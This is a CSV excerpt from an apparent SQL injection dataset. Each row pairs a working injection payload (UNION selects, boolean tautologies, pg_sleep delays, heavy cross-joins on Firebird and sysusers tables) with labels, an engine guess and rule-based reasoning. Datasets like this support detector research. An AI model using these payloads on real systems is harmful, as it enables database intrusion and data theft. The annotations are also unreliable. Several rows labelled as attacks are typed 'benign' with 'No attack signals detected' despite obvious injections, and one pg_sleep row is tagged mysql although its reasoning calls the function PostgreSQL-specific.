row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
6750,"1%' ) ) or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ( ( '%' = '",1,,heavy_query,firebird,0.95,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb detected — heavy_query injection (priority 6) on firebird",rule-based
6751,1' ) ) as pdcl where 6964 = 6964,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
6752,"-9504%"" ) ) or 8098 = 7472",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
6753,"-1956"" ) where 1448 = 1448 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --",1,,boolean_blind,postgresql,0.95,1448 = 1448 or detected — boolean_blind injection (priority 8) on postgresql,rule-based
6754,1%' ) and 4595 = 4595#,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
6755,1 ) where 9649 = 9649 and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --,1,,time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
6756,"1 and make_set ( 8403 = 8403,8899 ) -- rbxf",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
6757,"1"" and make_set ( 4214 = 9503,9503 ) and ""phjg"" like ""phjg",1,,boolean_blind,generic,0.95,"like "" detected — boolean_blind injection (priority 8) on generic",rule-based
6758,1%' ) union all select null--,1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
6759,"1' or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )",1,,heavy_query,generic,0.95,"select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers detected — heavy_query injection (priority 6) on generic",rule-based
6760,"-6527' ) ) union all select 5053,5053,5053,5053--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
6761,1' where 8864 = 8864,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
